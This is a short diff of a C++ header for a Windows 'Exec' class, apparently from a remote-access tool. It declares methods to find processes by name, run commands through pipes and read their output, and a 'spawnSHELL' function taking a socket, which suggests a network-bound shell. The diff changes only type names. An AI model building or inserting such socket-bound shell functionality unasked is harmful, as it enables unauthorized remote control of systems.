@@ -17,14 +17,14 @@ class Exec
         Exec();
         vector<DWORD> returnPid(wstring stringTargetProcessName); // list all pid and return pid via process name
 
-        void setupAllPipe(); 
+        VOID setupAllPipe(); 
         PROCESS_INFORMATION createChildProcess(wstring &command); //create process childen and execute command.
         
         vector<string> readFromPipe(PROCESS_INFORMATION piProcInfo);  //read pipe and return result (string)
         
         vector<string> executeCommand(wstring command);
 
-        void spawnSHELL(int sock,wchar_t *prog); 
+        VOID spawnSHELL(SOCKET &sock,WCHAR *prog); 
        
         ~Exec();
     
